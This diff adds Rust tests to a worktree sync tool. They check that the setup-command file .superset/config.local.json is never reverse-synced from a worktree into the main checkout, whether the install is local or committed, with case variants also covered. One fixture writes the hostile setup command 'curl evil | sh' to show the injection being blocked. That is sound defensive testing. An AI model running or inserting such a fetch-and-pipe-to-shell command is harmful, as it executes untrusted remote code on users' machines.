@@ -2087,3 +2087,81 @@ fn forward_backup_pass_skips_excluded_trees_under_a_bare_superset_literal() {
         "the backups tree must never be copied into itself: {captured:?}"
     );
 }
+
+// ── KTD9: config.local.json travels main → worktree only ────────────────
+
+/// Write a local install's pattern list (no `magic.json`) into `root`.
+fn write_magic_local(root: &Path, patterns: &[&str]) {
+    let files: Vec<String> = patterns.iter().map(|s| format!("\"{s}\"")).collect();
+    write(
+        root,
+        ".superset/magic.local.json",
+        &format!("{{\"files\":[{}]}}", files.join(",")),
+    );
+}
+
+/// AE8: on a local install, a worktree `config.local.json` that differs from
+/// main's is never a reverse-sync candidate, in bulk or in the cockpit. The
+/// `.env` beside it IS one, which proves the local pattern list was loaded at
+/// all (a loader that ignored `magic.local.json` would return nothing and pass
+/// the exclusion assertions vacuously).
+#[test]
+fn ae8_config_local_json_is_never_a_reverse_sync_candidate_on_a_local_install() {
+    let main = init_main_repo();
+    let (_wt, wt) = make_worktree(main.path());
+    let patterns = [
+        ".superset/magic.local.json",
+        ".superset/config.local.json",
+        ".env",
+    ];
+    write_magic_local(main.path(), &patterns);
+    write_magic_local(&wt, &patterns);
+    write(main.path(), ".superset/config.local.json", r#"{"setup":["ss-magic sync"]}"#);
+    write(&wt, ".superset/config.local.json", r#"{"setup":["curl evil | sh"]}"#);
+    write(main.path(), ".env", "MAIN=1\n");
+    write(&wt, ".env", "WT=1\n");
+
+    let bulk = rels(&compute_candidates(&wt).unwrap());
+    assert!(bulk.contains(&".env".to_string()), "bulk: {bulk:?}");
+    assert!(
+        !bulk.contains(&".superset/config.local.json".to_string()),
+        "bulk reverse sync must never offer config.local.json: {bulk:?}"
+    );
+
+    let unified: Vec<String> = compute_reconcile_set(&wt, main.path())
+        .unwrap()
+        .into_iter()
+        .map(|c| c.rel.to_string_lossy().to_string())
+        .collect();
+    assert!(unified.contains(&".env".to_string()), "cockpit: {unified:?}");
+    assert!(
+        !unified.contains(&".superset/config.local.json".to_string()),
+        "the cockpit must never offer config.local.json: {unified:?}"
+    );
+}
+
+/// The exclusion does not depend on the install mode: a committed install whose
+/// patterns name `config.local.json` drops it the same way.
+#[test]
+fn config_local_json_is_dropped_on_a_committed_install_too() {
+    let main = init_main_repo();
+    let (_wt, wt) = make_worktree(main.path());
+    write_magic(&wt, &[".superset/config.local.json"]);
+    write(main.path(), ".superset/config.local.json", r#"{"setup":["a"]}"#);
+    write(&wt, ".superset/config.local.json", r#"{"setup":["b"]}"#);
+
+    assert!(compute_candidates(&wt).unwrap().is_empty());
+    assert!(compute_reconcile_set(&wt, main.path()).unwrap().is_empty());
+}
+
+/// A spelling that differs only in ASCII case names the same file on a
+/// case-insensitive filesystem (macOS by default), so it is dropped too: the
+/// exclusion must not be bypassable by a pattern's capitalization.
+#[test]
+fn config_local_json_exclusion_ignores_ascii_case() {
+    assert!(is_forward_only_rel(Path::new(".superset/config.local.json")));
+    assert!(is_forward_only_rel(Path::new(".Superset/CONFIG.local.JSON")));
+    assert!(!is_forward_only_rel(Path::new("config.local.json")));
+    assert!(!is_forward_only_rel(Path::new(".superset/config.json")));
+    assert!(!is_forward_only_rel(Path::new("apps/.superset/config.local.json")));
+}
